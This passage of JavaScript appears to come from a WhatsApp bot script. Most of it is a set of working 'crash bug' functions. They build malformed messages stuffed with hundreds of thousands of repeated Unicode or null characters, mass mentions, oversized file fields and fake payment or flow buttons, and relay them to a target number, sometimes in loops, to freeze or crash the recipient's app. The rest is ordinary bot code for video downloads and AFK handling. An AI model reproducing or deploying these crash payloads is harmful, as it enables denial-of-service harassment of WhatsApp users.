			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 尺Ẕχ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️\",\"sections\":[{\"title\":\"尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await krocov4.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};
		

		async function TxOs(X, Ptcp = false) {
			await krocov4.relayMessage(X, {
					extendedTextMessage: {
						text: "⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(150000),
						contextInfo: {
							mentionedJid: [
								"6281991410940@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: X,
							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽",
								body: "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://www.instagram.com/raditx7",
								mediaUrl: "https://www.instagram.com/raditx7",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://www.instagram.com/raditx7"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By AkmalMods〽️"));
		};
		
		
async function sendInteractiveListMessage(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '𝐙𝐄𝐓.𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍' + "༽ꪾྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷ".repeat(100000),
                        },
                        body: {
                            text: '',
                        },
                        footer: {
                            text: '𝐃𝐢𝐞𝐖𝐢𝐭𝐡𝐘𝐨𝐮' + "༽ꪾྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷ".repeat(100000),
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝐙𝐄𝐓.𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝐙𝐄𝐓.𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝐙𝐄𝐓.𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: '\0'.repeat(100000),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await krocov4.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function executionZ(chatId) {
    var messageContent = generateWAMessageFromContent(chatId, proto.Message.fromObject({
        'viewOnceMessage': {
            'message': {
                'interactiveMessage': {
                    'header': {
                        'title': '',
                        'subtitle': '𝐈'
                    },
                    'body': {
                        'text': '𝐉𝐔𝐒𝐓' + "̒༽ꪾྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷ".repeat(100000)
                    },
                    'footer': {
                        'text': '𝐖𝐀𝐍𝐍𝐀 𝐁𝐄 𝐘𝐎𝐔𝐑𝐒' +  "̒༽ꪾྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷྫྷ".repeat(100000)
                    },
                    'nativeFlowMessage': {
                        'buttons': [
                            {
                                'name': 'cta_url',
                                'buttonParamsJson': JSON.stringify({
                                    display_text: '𝐙𝐄𝐓.𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍 〤',
                                    url: 'https://google.com',
                                    merchant_url: 'https://google.com' //
                                })
                            },
                            {
                                'name': 'cta_url',
                                'buttonParamsJson': JSON.stringify({
                                    display_text: '𝐙𝐄𝐓.𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍 〤',
                                    url: 'https://google.com', 
                                    merchant_url: 'https://google.com'
                                })
                            },
                            {
                                'name': 'cta_url',
                                'buttonParamsJson': JSON.stringify({
                                    display_text: '𝐙𝐄𝐓.𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍 〤',
                                    url: 'https://google.com',
                                    merchant_url: 'https://google.com' // 
                                })
                            }
                        ],
                        'messageParamsJson': "\0".repeat(100000)
                    }
                }
            }
        }
    }), {
        'userJid': chatId
    });

    return krocov4.relayMessage(chatId, messageContent.message, {
        'messageId': messageContent.key.id
    });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await krocov4.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + '​⃟̶̽'.repeat(1000000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await krocov4.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(1000000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await krocov4.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return krocov4.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return krocov4.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

async function bugPayment(chats) {
await krocov4.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: chats} })
} 

async function BugPayment(jid){
await krocov4.relayMessage(jid, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {}}, interactiveMessage: {
nativeFlowMessage: {
buttons: [
{
name: 'payment_info',
buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
},
],
}}}}}, { participant: { jid: jid } }, { messageId: null })}

async function coresix(target, text, amount, ptcp = false) {
    await krocov4.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(100000)}\",\"screen_0_TextInput_1\":\"∴.·:¨⋆¨:·. ⚘.·:¨ ¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼ .·:¨⋆¨:·. ⚘.·:¨ ¨:·.∴̲̅\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: target } } : {}
    );
};


async function replyzz(teks) {
    return krocov4.sendMessage(m.chat, {
        text: `${teks}`,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                thumbnailUrl: ppuser, 
                title: "⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆",
                body: "▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽",
                previewType: "PHOTO"
            }
        }
    }, { quoted: extd }); 
}

            
const akmalbug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️`
}
}
}



const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '0@newsletter',
    newsletterName: '',
    caption: body
}}}

const reaction = async (jidss, emoji) => {
    krocov4.sendMessage(jidss, {
        react: {
            text: emoji,
            key: m.key
        }
    })
}

//=========================================\\
// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
reply(mess.wait)
try {
 
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*

*Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_

\`⏤͟͟͞͞ Downloader By ${global.nameowner}\`
`;
  krocov4.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
const data2 = await fetchJson(`https://widipe.com/download/tikdl?url=${encodeURIComponent(budy)}`);
const caption = `┈──────────────────────⫺
            *ㄒ丨ҜㄒㄖҜ         丨几千ㄖ*
┈──────────────────────⫺
*Title*: ${data2.result.title}

_Download By ${global.nameowner}_`;
const vidnya = data2.result.video;
krocov4.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
}
  }
//=========================================\\
const jimp = require("jimp")
const doct = fs.readFileSync(`./media/doct.jpg`)
const doct2 = fs.readFileSync(`./media/doct2.jpg`)
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
async function prM(params) {
    return await prepareWAMessageMedia(params, { upload: krocov4.waUploadToServer })
}
//=========================================\\





//Auto Download Video Facebook
if(budy.includes('https://www.facebook.com/')){
const fg = require('api-dylux')
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replyzz('Url invalid')
  }
  try {
    const result = await fg.fbdl(budy);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    krocov4.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replyzz('Maybe private video!')
  }
}
//=========================================\\
async function loading () {
var fuckdellod = [
"ʟᴏᴀᴅɪɴɢ...",
"ʟᴏᴀᴅɪɴɢ..",
"ʟᴏᴀᴅɪɴɢ.",
"ʟᴏᴀᴅɪɴɢ..",
"ʟᴏᴀᴅɪɴɢ...",
"ʟᴏᴀᴅɪɴɢ..",
"ᴄᴏᴍᴘʟɪᴛᴇ!"
]
let { key } = await krocov4.sendMessage(from, {text: '⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆'})

for (let i = 0; i < fuckdellod.length; i++) {
await krocov4.sendMessage(from, {text: fuckdellod[i], edit: key });
}
}
        if (!krocov4.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            krocov4.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        krocov4.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        krocov4.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        krocov4.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let fuckdelrecordin = ['recording','composing']
        let fuckdelrecordinfinal = fuckdelrecordin[Math.floor(Math.random() * fuckdelrecordin.length)]
        krocov4.sendPresenceUpdate(fuckdelrecordinfinal, from)

        }
        
        if (autobio) {
            krocov4.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return krocov4.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await krocov4.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await krocov4.getName(i)}\nFN:${await krocov4.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            
			console.log(chalk.green(`GRUP CHAT:`))
            console.log(chalk.black(chalk.bgWhite('')), chalk.black(chalk.bgRed(new Date)), chalk.black(chalk.bgRed(budy || m.mtype)) + '\n' + chalk.magenta('dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            
			console.log(chalk.green(`PRIBADI:`))
            console.log(chalk.black(chalk.bgRed('')), chalk.black(chalk.bgRed(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('dari'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
               
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replyzz(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                krocov4.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
        
            case 'addprem':
                if (!isCreator) return replyzz(mess.owner)
                if (args.length < 2)
                    return replyzz(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyzz("Premium Success")
                } else {
